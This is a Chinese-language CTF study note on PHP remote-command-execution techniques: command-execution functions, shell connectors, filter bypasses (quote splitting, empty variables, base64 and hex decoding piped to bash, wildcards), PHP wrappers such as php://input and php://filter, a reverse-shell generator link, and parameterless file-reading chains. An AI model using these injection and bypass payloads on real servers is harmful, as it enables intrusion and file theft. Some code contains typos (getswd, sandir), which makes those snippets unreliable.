---
description: 这里是CTF做题时常见的会遇见的RCE的漏洞知识点总结
---

# 😅 RCE漏洞知识点总结

## <mark style="color:blue;background-color:purple;">1.PHP常见的命令执行函数</mark>

### <mark style="color:green;background-color:blue;">1)system()</mark>

执行外部程序，<mark style="background-color:orange;">**并且返回命令输出的最后一行输出**</mark>

> `system(string [command],int [result_code]=null):string | status`

### <mark style="color:green;background-color:blue;">2）exec()</mark>

执行外部程序，但是<mark style="background-color:orange;">**输出执行结果的最后一行内容**</mark>

> `exec(string[command],array[output]=null,int[result_code]=null):string|status`

### <mark style="color:green;background-color:blue;">3）passthru()</mark>

执行外部程序，并且<mark style="background-color:orange;">**显示原始输出**</mark>

> `passthru(string[command],int[result_code]=null):null?false`

### <mark style="color:green;background-color:blue;">4)eval()</mark>

把字符串作为php代码执行，<mark style="background-color:orange;">**无回显**</mark>

> `eval(string[command]:mixed`

注意，eval不能包含打开/关闭的php tags，就是不能包含完整的，但是可以用？>xxxxxx\<?php这种。除此之外，传入的必须是有效的php代码，要以**分号**结尾。

### <mark style="color:green;background-color:blue;">5）shell\_exec()</mark>

通过shell执行命令，<mark style="background-color:orange;">**并将完整的输出以字符串的方式返回**</mark>

> `shell_exec(string[command])。`

### <mark style="color:green;background-color:blue;">6）执行运算符</mark>

反引号在php中等同于`shell_exec()`，将反引号中的内容作为shell命令来执行，并且输出信息返回。如果要看到输出的信息，需要用echo或者print来包裹他。

> `` `command` ``

### <mark style="color:green;background-color:blue;">7）escapeshellarg()</mark>

转义字符串以用作shell参数。在字符串周围添加单引号，并且转义现有的单引号（自动转义），连续的反斜杠还有会额外的反斜杠转义。返回<mark style="background-color:orange;">**转义的字符串，主要用来转义shell函数的参数**</mark>

> `escapeshellarg(string [arg]):string`

### <mark style="color:green;background-color:blue;">8)escapeshellcmd（）</mark>

就是加了个转义符和上面一样都只有转义的功能

> `escapeshellcmd(string[command]):string`

以下字符前面有一个反斜杠： `&#;|*?~<>^()[]{}$\·\x0A 和\xFF`。



{% hint style="info" %}
7和8一般是和system等这种能执行外部命令的函数一起使用。他们没有执行功能
{% endhint %}

***

## <mark style="color:blue;background-color:purple;">2.linux连接符</mark>

### <mark style="color:green;background-color:blue;">1）</mark><mark style="color:green;background-color:blue;">`&`</mark><mark style="color:green;background-color:blue;">和号操作符</mark>

`&`操作符是使命令在后台运行

> 在后台运行：就是如果我们放在前台运行，那么我们将该终端端口关掉，这个进程也会结束。如果我们放在后台运行，任务不会终止。

比如我们平常执行ping的时候

但是当我们执行下面的语句的时候

```sh
ping baidu.com &
```

<figure><img src="../.gitbook/assets/image 1 (1).png" alt=""><figcaption></figcaption></figure>

我们使用ctrl+c无法停止这个进程，说明他已经在后台进行了。

&可以一口气执行好几个命令，只要在每条命令后面加一个&就可以，并且是**同时执行的**。

### <mark style="color:green;background-color:blue;">2）分号操作符；</mark>

分号操作符可以让你一口气执行好几个命令，并且<mark style="background-color:yellow;">**按顺序执行**</mark>

```sh
apt-update;makdir test;cat 1.php
```

上述命令先执行更新，再执行创建文件夹，最后执行查看1.php文件。

### <mark style="color:green;background-color:blue;">3）与操作符&&</mark>

如果第一个命令成功才能执行第二个命令。

```sh
ping -c3 www.baidu.com && links www.baidu.com
```

在上述语句中，只有主机先在线了，我们在终端中访问网站www.baidu.com

### <mark style="color:green;background-color:blue;">4）或操作符||</mark>

或操作符就像**if else**语句，上面的操作符允许你在第一个命令失败的情况下执行第二个命令，不然就只会执行第一个命令。

```sh
apt-get update || links baidu.com
```

如果更新执行成功了，那么就不会执行访问百度的指令，如果用户不允许更新，也就是失败了，那么才能执行访问baidu的指令。

### <mark style="color:green;background-color:blue;">5）|管道操作符</mark>

管道操作符就相当于是<mark style="background-color:yellow;">**将第一个命令的输出作为了第二个命令的输入**</mark>

```sh
ls -l | less
```

比如说，在上述片段中，我们将ls输出的当前目录下的结果，用less输出。

***

## <mark style="color:blue;background-color:purple;">3.过滤姿势</mark>

这里参照的freebuf上面的一篇文章。那我们就按照他的进行学习。

### <mark style="color:green;background-color:blue;">1）过滤关键词，如cat，more等</mark>

#### <mark style="color:red;background-color:orange;">**①method one：替换法**</mark>

我们可以同义词替换，比如cat的指令相同的有

**`more`**：把文本一页一页地显示在界面上。

**`less`**：和more很像，但是more只能从前往后看，但less也可以从后往前看。

**`head`**：只看前几行

**`tac`**：从最后一行开始看（是cat反过来）

**`tail`**：只看最后几行

**`nl`**：显示的时候顺便显示行号

**`sort`**：对文本内容进行排序

#### <mark style="color:red;background-color:orange;">**②method two：进行转义**</mark>

为了验证这个，我们最好在自己的虚拟机上进行验证。对cat 1.php进行转义

（一）：就是添加\，在任何地方都可以被过滤掉的地方添加就行

```sh
ca\t 1.php
```

<figure><img src="../.gitbook/assets/image 2 (1).png" alt=""><figcaption></figcaption></figure>

（二）：**添加双引号**，转化为字符串

（对于这个，我在自己虚拟机上实验的时候发现别人写的好像实现不了，所以我在自己的虚拟机上实验过后，发现应该是在任何地方加一对双引号，不是只有单个的一个）

```sh
ca"t" 1.php

```

<figure><img src="../.gitbook/assets/image 3 (1).png" alt=""><figcaption></figcaption></figure>

（三）：**添加单引号**，转化为字符串

```sh
c'at' 1.php

```

<figure><img src="../.gitbook/assets/image 4 (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">**③method three：拼接法**</mark>

将某个完整的部分分成几个部分用变量代替。

比如以下的

```sh
a=1.;b=php;cat $a$b
```

<figure><img src="../.gitbook/assets/image 5 (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">**④method four：空变量绕过**</mark>

空变量有:`$*,$@,$x,${X}`

```sh
ca$*t 1.php

```

<figure><img src="../.gitbook/assets/image 6 (1).png" alt=""><figcaption></figcaption></figure>

```sh
ca$@t 1.php 
```

<figure><img src="../.gitbook/assets/image 7 (1).png" alt=""><figcaption></figcaption></figure>

```sh
ca$1t 1.php
```

<figure><img src="../.gitbook/assets/image 8 (1).png" alt=""><figcaption></figcaption></figure>



{% hint style="info" %}
通过实验发现，上述的x需要与后面的字符不是同一类型，比如后面是字母，那么x就只能是数字。
{% endhint %}

```sh
ca${1}t 1.php
```

<figure><img src="../.gitbook/assets/image 9 (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;background-color:blue;">2）反引号执行，$()执行</mark>

当执行函数比如`system，eval，exec`这些都被过滤了，我们可以考虑执行符反引号\`\`

除此之外，我们也可以用$()来包含要执行的指令

### <mark style="color:green;background-color:blue;">3）Base64编码</mark>

我们可以把关键词，比如cat，或者ls用先用base64编码，再解码执行。

这个步骤可以参考下述代码

```sh
echo 'cat' | base64  //对cat进行base64编码
echo 'Y2F0Cg==' | base64 -d//对Y2F0Cg==进行解码，和cat对上了，说明没有错误
`echo 'Y2F0Cg=='|base64 -d ` 1.php//得出最后的执行代码是这个
```

<figure><img src="../.gitbook/assets/image 10 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image 11 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image 12 (1).png" alt=""><figcaption></figcaption></figure>



{% hint style="info" %}
这里补充一个，那个对于base64编码的最后的执行语句还能写成下面的形式，主要是对于反引号\`\`被过滤的情况。
{% endhint %}

```sh
echo 'Y2F0Cg=='|base64 -d | bash
$(echo 'Y2F0Cg=='|base64 -d)
```

### <mark style="color:green;background-color:blue;">4）通配符绕过</mark>

> 通配符
>
> 通配符是一种特殊符号，主要有\*和？两种，用来模糊搜索文件
>
> \*:代表任何字符串
>
> ？：代表单个字符串

所以我们可以写出如下的shell。

```sh
cat 1*
cat 1??hp
```

<figure><img src="../.gitbook/assets/image 13 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image 14 (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;background-color:blue;">5)hex编码</mark>

介绍hex编码，就需要介绍一个linux指令xxd（这个指令linux好像不自带，反正我的kali就不含这个指令，还得下载）

> xdd命令的功能是用于**以十六进制形式显示文件内容**，亦可以将十六进制内容转换回原始二进制的形式。

```sh
echo '63617420312e706870'|xxd -r -p |bash 
```

<figure><img src="../.gitbook/assets/image 15 (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;background-color:blue;">6）空格过滤</mark>

我们可以用`<>,%20,%09,$IFS,${IFS},(cat,flag),<,>`这些去过滤

### <mark style="color:green;background-color:blue;">7）括号过滤</mark>

#### **①method one：**

我们需要去积累一些不需要用括号的函数，因为有时候括号被过滤了，但是一些函数还是可以使用

`（一）echo ，print`

`（二）require，include，require_one,include_one`

`（三）die`

***

## <mark style="color:blue;background-color:purple;">4.反弹shell</mark>

之前老师上课的时候分享过一个反弹shell一件生成器。直接把他放在这里了。

[https://forum.ywhack.com/shell.php](https://forum.ywhack.com/shell.php)

反弹shell的目的是为了让受害者（也就是目标机）自己来连接攻击机，因为攻击机如果正向连接，需要突破防火墙，防火墙一般是防进不防出，所以我们可以通过命令执行去让受害者来自己连接我们。



***

## <mark style="color:blue;background-color:purple;">5.PHP伪协议</mark>

对于伪协议的具体含义，我们需要从几个与文件处理相关的函数来了解，除了我们之前提到的include，require之外的。

### <mark style="color:green;background-color:blue;">1）文件系统函数</mark>

#### <mark style="color:red;background-color:orange;">**①fopen()**</mark>

打开文件或者url。并且将filename指定的资源绑到一个流上。

```php
fopen(string[filename],string[mode],bool[use_include_path]=false,?resource[content]=null):resource|false
```

#### <mark style="color:red;background-color:orange;">**②copy()**</mark>

作用和名字一样，就是拷贝文件。

```php
copy(string[from],string[to],?resource[content]=null):bool
```

#### <mark style="color:red;background-color:orange;">**③file\_exists(）**</mark>

检验文件是否存在

```php
file_exists(string[filename]):bool
```

#### <mark style="color:red;background-color:orange;">**④filesize()**</mark>

取得文件大小

```PHP
filesize(string[filename]):int|false
```



{% hint style="info" %}
封装协议的url语法支持schema://....语法，其他的语法是不支持的。
{% endhint %}

### <mark style="color:green;background-color:blue;">2）支持的协议和封装协议</mark>

#### <mark style="color:red;background-color:orange;">**①file://**</mark>

作用：访问本地文件系统

> 文件系统：是php默认的文件系统，指定了本地文件系统。当指定了相对路径（不以/,\，\\,或windows的盘开头的）提供的路径将基于当前的工作目录。

这里展现一些路径的写法

* 文件路径
  * `/path/to/file.ext`
  * 【这是一个unix路径，从/根目录开始，然后指定了路径】
  * `relative/path/to/file.ext`
  * 【这是一个相对路径，从当前目录的子目录relative开始，然后进入到file.ext】
  * `fileInCwd.ext`
  * 【直接指向当前目录下的fileInCwd.ext文件】
  * `C:/path/to/winfile.ext`
  * 【win下面的路径】
  * `C:\path\to\winfile.ext`
  * 【和上面同理】
  * `\\smbserver\share\path\to\winfile.ext`
  * 【这是一个UNC（universal naming convention）通用命名路径，win环境中使用，smbserver是服务器或者ip名字，比如127.0.0.1,share是共相文件夹名称，path/是路径。】
  * `file:///path/to/file.ext`
  * 【这一下个就清晰多了，除去file://，这个代表的是文件系统，然后就是/path/to/file.ext这个是文件路径】

除此之外好像还要掌握封装协议的概要，这里就直接贴图了，反正是yes或者no也没什么好解释的。



<figure><img src="../.gitbook/assets/image 16 (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">**②http:// https://**</mark>

这个就很熟悉了，访问网址。

> 这个用的是http/1.0 GET。

不多说了，直接上用法

* 用法
  * `http://example.com`
  * 【就是访问example.com域上的内容】
  * `http://example.com/file.php?var1=val1&var2=val2`
  * 【指向example.com域上的file.php内容，并且传入了两个参数】
  * `http://user:password@example.com`
  * 【包含用户名，密码的url】
  * `https://example.com https://example.com/file.php?var1=val1&var2=val2 https://user:password@example.com`
  * 【利用了https协议，更安全】

<figure><img src="../.gitbook/assets/image 17 (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">**③ftp:// ftps://**</mark>

和http差不多，只不过访问的是ftp远程服务器。而且允许读取文件，创建文件。

*   用法

    `ftp://example.com/pub/file.txt ftp://user:password@example.com/pub/file.txt ftps://example.com/pub/file.txt ftps://user:password@example.com/pub/file.txt`

<figure><img src="../.gitbook/assets/image 18 (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">**④php://**</mark>

作用就是访问输入输出流（i/o流）

#### **（1）php://input**

访问请求的原始数据的只读流。

```php
php://input + [POST DATA]执行php代码
```

以上这个代码主要是用于写入木马。

如果启用了 `enable_post_data_reading` 选项， `php://input` 在使用 `enctype="multipart/form-data"` 的 POST 请求中不可用。

#### **（2）php：//output**

只写的数据流，允许以print和echo的方式写入。

#### **（3）php://filter ！！！！**

是一种元封装器，设计用于数据流打开时的筛选过滤应用。

我们需要掌握他参数的具体写法。

<figure><img src="../.gitbook/assets/image 19 (1).png" alt=""><figcaption></figcaption></figure>

可选项也要了解一下

<figure><img src="../.gitbook/assets/image 20 (1).png" alt=""><figcaption></figcaption></figure>

我们这里主要详细讲解一下常用的几个语句的解释。

```php
php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）
```

`php://filter/read=convert.base64-encode/resource=` 是一种可以用于读取和编码文件内容的 PHP 文件包装器（PHP file wrapper）。该方法通常用于查看 PHP 文件的源代码，特别是在通过 HTTP 请求传递文件名时。这样是为了用base64的方法返回。

#### <mark style="color:red;background-color:orange;">**⑤data://**</mark>

就连手册上都是直接简单的数据流封装器。一般和include一起用，因为会被当成文件执行。

直接掌握下面两个语句,直接将text的内容转换为php代码。

```php
data://text/plain;base64,[text]
```

```php
data://text/plain,【text】
```

***

### <mark style="color:blue;background-color:purple;">6.无参数读取</mark>

<mark style="background-color:red;">参考</mark>[<mark style="background-color:red;">https://www.freebuf.com/articles/web/261800.html</mark>](https://www.freebuf.com/articles/web/261800.html)

当我们的过滤限制非常大的时候，如以下情况

<figure><img src="../.gitbook/assets/image 21 (1).png" alt=""><figcaption></figcaption></figure>

我们就需要考虑无参数读文件了。首先我们需要知道什么叫做无参数。

> 无参数：
>
> 就是函数包着函数，且函数没有参数。，就比如`a(b(c(d())))`这种形式就是无参数。

## <mark style="color:green;background-color:blue;">1）无参数文件读取</mark>

这里首先介绍很多的函数，后面用的，希望等到后面的时候可以根据这些函数，自己想到逻辑。所以第一步介绍函数比较利于后面的知识。

#### <mark style="color:red;background-color:orange;">①scandir()</mark>

列出指定路径中的文件和目录

> scandir(string\[directory],int\[sorting\_order]=SCANDIR\_SORT\_ASCENDING,?resource\[context]=null):array|false

上述参数的意义就是他们的英文的本意。所以我们如果用`scandir('.')`，就是代表当前目录下的所有文件，并且他的返回结果是数组。我们可以实验看看。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

从上述结果可以看出来，在当前的目录下，0是当前目录，2是目录下的文件，3是.vscode下面的文件也就是当前的执行文件。

{% hint style="info" %}
我们平时利用的，就是这个array\[0]，他代表是.这个独特的字符。
{% endhint %}

#### <mark style="color:red;background-color:orange;">②localeconv（）</mark>

是一个获得数字格式信息。（可能你无法理解这个数字格式信息，没有关系，我们将通过实验展示这个返回值）。

```php
localeconv():array
```

可以看到这个函数是没有参数要输入的，并且返回值是一个数组。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

因为一些格式等原因，这个上面输入不全，我们直接看最后的输出结果的正确格式。

<pre class="language-php"><code class="lang-php">Array
(
    [decimal_point] => .  //小数点字符
    [thousands_sep] =>    //千分隔符
    [int_curr_symbol] => EUR //国际货币符号（即美元）
    [currency_symbol] => €  //当地货币符号（即 $）
    [mon_decimal_point] => ,  //货币小数点字符
    [mon_thousands_sep] =>    //货币千分隔符
    [positive_sign] =>      //为正值签名
    [negative_sign] => -     //负值的符号
    [int_frac_digits] => 2       //国际小数位数字
    [frac_digits] => 2      //本地小数位
    [p_cs_precedes] => 1     //如果 currency_symbol 在正值之前，则为 true，如果在正值之后，则为 false
    [p_sep_by_space] => 1    //如果空格将currency_symbol与正空格分开，则为 true value，否则为 false
    [n_cs_precedes] => 1     //如果空格将currency_symbol与正空格分开，则为 true value，否则为 false
    [n_sep_by_space] => 1    //如果空格将currency_symbol与负数分开，则为 true value，否则为 false
    [p_sign_posn] => 1       //0 - 数量和currency_symbol括号
                             //1 - 符号字符串位于数量和currency_symbol之前
                             //2 - 符号字符串接替数量和currency_symbol
                             //3 - 符号字符串紧接在currency_symbol之前
                             //4 - 符号字符串立即接替currency_symbol
    [n_sign_posn] => 2      //0 - 数量和currency_symbol括号
                            //1 - 符号字符串位于数量和currency_symbol之前
                            //2 - 符号字符串接替数量和currency_symbol
<strong>                           //3 - 符号字符串紧接在currency_symbol之前
</strong>                            //4 - 符号字符串立即接替currency_symbol
    [grouping] => Array    //包含数值分组的数组
        (
        )

    [mon_grouping] => Array   //包含货币分组的数组
        (
            [0] => 3
            [1] => 3
        )

)
</code></pre>

{% hint style="info" %}
其实，我们在利用的时候，主要利用的就是第一个array\[0]的点
{% endhint %}

#### <mark style="color:red;background-color:orange;">③current</mark>

返回数组中的当前值

```php
current(array|object[array]):mixed
```

每个数组中都有一个内部的指针指向它“**当前的**”单元，初始化时会指向该数组中的第一个值。就是说我们用`current(array)`的时候返回的是array的第一个值

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

可以看到返回`localeconv()`的第一个结果`.`

#### <mark style="color:red;background-color:orange;">④pos()</mark>

是`current()`的别名，就是说等同于`current()`一样的。

#### <mark style="color:red;background-color:orange;">⑤reset()</mark>

将数组的内部指针指向<mark style="color:purple;">**第一个单元**</mark>。

```php
reset(array|object[array]):mixed
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

可以看到虽然有警告，但是还是输出了.

#### <mark style="color:red;background-color:orange;">⑥end()</mark>

将数组的内部指针指向最后一个单元

```php
end(array|object[array]):mixed
```

易得，就是得到数组的最后一个元素。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">⑦next()</mark>

将数组中的内部指针向前移动一位，返回当前指针的下一位。

```php
next(array|object[array]):mixed
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
这里有一个重要的地方，就是当我在用`next(localeconv())`实验时，结果出不来。后来通过chatgpt了解到因为 `localeconv()` 返回的是一个关联数组，而 `next()` 通常用于数组的内部指针移动，而不是关联数组
{% endhint %}

#### <mark style="color:red;background-color:orange;">⑧prev()</mark>

将指针往前移一位

```php
prev(array|object[array]):mixed
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">⑨each（）</mark>

{% hint style="danger" %}
在这个函数之前先强调:这个函数PHP7.2.0之后（8也别想了），都用不了。
{% endhint %}

返回当前的键值对，并且将指针向前移动一步。

（本人环境8.0，实验不了）

#### <mark style="color:red;background-color:orange;">⑩chr()</mark>

从数字生成单字节字符串,就是根据ASCII码生成对应的char。

```php
chr(int[codepoint]):string
```

{% hint style="info" %}
因为ascii码是从0-255，所以当大于255之后，就会通过<mark style="color:red;">%256</mark>来得到最后的ascii码
{% endhint %}

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

所以这里贴出来ascii码的表，有几个需要特别记住的。

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们需要特别知道46对应的`.`

#### <mark style="color:red;background-color:orange;">1① rand()</mark>

产生随机数

```php
rand():int
rand(int[min],int[max]):int
```

其实我们通过c语言知道他是伪随机，但是我们只能用rand（）在无参数的情况下，所以我们得到的结果是非常不确定的。就也不知道究竟什么时候能用到。

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">1②time()</mark>

返回当前的unix时间戳，我们在取证的时候学过时间戳是什么。这里就不多赘述了。

```php
time():int
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">1③localtime()</mark>

取得本地时间

```php
localtime(?int[timestamp]=null,bool[associative]=false):array
```

和我们当时的localeconv一样，返回一个数组，上面的timestamp是某一个时间戳，如果没有指定就是本地时间。后面是选择数字数组还是关联数组。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

很明显我得到的是数字数组，算了，直接把代表的含义贴出来了，反正我这是数字数组，没啥好看的。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">1④phpversion()</mark>

返回php的版本号

```php
phpversion()
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">1⑤ord（）</mark>

转换字符串第一个字节为 0-255 之间的值，和chr()刚好相反，所以这里就不举例了，不过可以帮我们有时候不想查找ascii码表的时候使用。



#### <mark style="color:red;background-color:orange;">1⑥floor（）</mark>

舍去法取整(向下取整），就是直接把小数点去掉。

```php
floor(int|float[num]):float
```

<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
这个地方注意一下啊，如果要用于版本号，那么版本号只能有一个小数点，我看都参考的文章用了这个`floor(phpversion()),这个用在我的环境下是报错的，因为我的版本是8.2.12，不是小数，用不了。`
{% endhint %}



#### <mark style="color:red;background-color:orange;">1⑦sqrt（）</mark>

平方根

```php
sqrt(float[num]):float
```

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">1⑧tan()</mark>

就是数学的tan（正切）

#### <mark style="color:red;background-color:orange;">1⑨cosh()</mark>

数学cos(双曲余弦）

#### <mark style="color:red;background-color:orange;">20sinh()</mark>

数学sin(正弦）

#### <mark style="color:red;background-color:orange;">2①ceil()</mark>

向上取整

```php
ceil(int|float[num]):float
```

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">2②crypt（）</mark>

单向字符串散列，单向是说只能加密，没有decode函数来解密；散列我们在取证的时候也学过就是哈希值。

```php
crypt(string[string],string[salt]):string
```

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
这个地方需要注意一个事情，这个函数后面的salt在8.0版本之前是可选的，但是8.0之后必须存在，所以在8.0环境下只有一个字符串会报错，就是用不了，但是那个参考文章没有说明这个事情，事实就是所有的都是在越来越安全。所以这个方法我都不打算讲了。
{% endhint %}

#### <mark style="color:red;background-color:orange;">2③getcwd()</mark>

取得当前工作目录

```php
string():string|false
```

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">2④realpath()</mark>

返回规范化的绝对路径名

```php
realpath(string[path]):string|false
```

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">2⑤show\_source()   / highlight\_file()</mark>

{% hint style="info" %}
这两个函数都可以使用，是一样的。
{% endhint %}

这里解释highlight\_file()的用法，因为手册上就写了这个，另外一个都没写。

作用：语法高亮一个文件。因为使用这个函数的返回值，如果return被设置成了高亮后的代码不会被打印，false会被打印，默认是false。

```php
highlight_file(string[filename],bool[return]=false):string|bool
```

<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

虽然有warning，但是代码还是出现了。

#### <mark style="color:red;background-color:orange;">2⑥readfile()</mark>

输出文件。

```php
readfile(string[filename],bool[use_include_path],?resource[context]=null):int|false
```

{% hint style="danger" %}
报错了，因为PHP5.3以上默认只能传递具体的变量，而不能通过函数返回值传递。参考的文章说不影响使用，但是其实在本人的环境下，是使用不了的。
{% endhint %}

#### <mark style="color:red;background-color:orange;">2⑦file\_get\_contents()</mark>

将整个文件读入一个字符串

```php
file_get_contents(
    string $filename,
    bool $use_include_path = false,
    ?resource $context = null,
    int $offset = 0,
    ?int $length = null
): string|false
```

{% hint style="danger" %}
同样的错误
{% endhint %}

#### <mark style="color:red;background-color:orange;">2⑧array\_reverse</mark>

返回单元顺序相反的数组,就是输出的数组的顺序相反了。

```php
array_reverse(array $array, bool $preserve_keys = false): array
```

<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">2⑨array\_flip（）</mark>

交换键和值。

```php
 array_flip(array $array): array
```

<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">30array\_rand()</mark>

从数组中随机抽出一个或多个<mark style="color:red;">随机键</mark>

```php
array_rand(array $array, int $num = 1): int|string|array
```

<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">3①dirname()</mark>

返回路径中的目录部分，他不会返回文件，之前介绍的都是会返回文件。

```php
dirname(string $path, int $levels = 1): string
```

对于这个函数的返回值需要好好的讲一下。

它返回的是path的父目录，如果没有斜线，就返回`.`表示当前目录，否则就是去除了最后一根/以及后面的内容。下面是一些例子。

```php
<?php
dirname('.');    // Will return '.'.
dirname('/');    // Will return `\` on Windows and '/' on *nix systems.
dirname('\\');   // Will return `\` on Windows and '.' on *nix systems.
dirname('C:\\'); // Will return 'C:\' on Windows and '.' on *nix systems.
?>
```

<figure><img src="../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">3②chdir()</mark>

改变目录

```php
chdir(string $directory): bool
```

这里需要注意他的返回值是0和1，所以他的应用可能有点没那么实用。

<figure><img src="../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="background-color:purple;">**接下来我们要介绍一些比较固定的搭配**</mark>

#### <mark style="color:red;background-color:orange;">（1）查看当前文件目录名</mark>

```php
print_r(scandir('.'));
print_r(scandir(current(localeconv())));
print_r(scandir(pos(localeconv())));
print_r(scandir(reset(localeconv())));
```

这样会让文件以数组的形式输出.

其实后面的`current(localeconv()),pos(localeconv()),reset(localeconv())`都是在构造`'.'`。

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

除上述之外还有一些也能这样，但是是概率事件，就不是确定。

```php
print_r(scandir(chr(46)));
print_r(scandir(chr(rand())));
print_r(scandir(chr(time())));
print_r(scandir(reset(localtime(time()))));
```

其实后面三个都是要看运气的，这里是因为后面三个生成的数字太大了，不存在，所以就输出了这个唯一的路径。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

对于这个.的构造我们还可以通过数学方法计算来得到46，可以但是应该很难算，而且现在来说限制太大了，我的环境实验不出来，但是还是贴出一些例子大家参考参考

```php
tan(floor(phpversion()));
```

我们还可以通过绝对路径来查看当前文件名

```php
print_r(end(scandir(getcwd())));
print_r(end(scandir(realpath('.'))));
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:red;background-color:orange;">（2)读取当前目录下文件内容</mark>

```php
show_source(end(scandir(getcwd())));
highlight_file(end(scandir(getcwd())));
readfile(end(scandir(getcwd())));
file_get_contents(end(scandir(getcwd())));
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">其实对于这个实验结果我是有点惊讶的。因为最开始对单个函数实验的时候，只有一个成功了，结果用无参数读取的时候，只有第四个没有成功，所以我们可以得到，前三个都是可用的。</mark>

除此之外，这里还有很多读取其他文件的方法，就不实现了，直接展示出来。

```php
show_source(current(array_reverse(scandir(getcwd()))));
//将最后一位的文件放到第一位来读取
show_source(next(array_reverse(scandir(getcwd()))));
//读取倒数第二个的文件
show_source(array_rand(array_flip(getcwd())));
//读取其他文件
```

#### <mark style="color:red;background-color:orange;">(3)读取其他文件目录下内容</mark>

```php
print_r(scandir(dirname(getswd())));
//查看上一级目录
print_r(sandir(next(scandir(getcwd()))));
//查看上一级目录
```

{% hint style="info" %}
如果我们想读取上级目录文件的内容，那么我们得使用chdir(),必须改变当前工作目录，不然会报错
{% endhint %}

```php
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
```



## <mark style="color:green;background-color:blue;">2)无参数命令执行</mark>

当出现以下这种情况的时候，我们就需要知道他是要我们采取无参数命令执行了。

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>







## <mark style="background-color:red;">参考传递门：</mark>

[https://www.freebuf.com/articles/web/261800.html](https://www.freebuf.com/articles/web/261800.html)
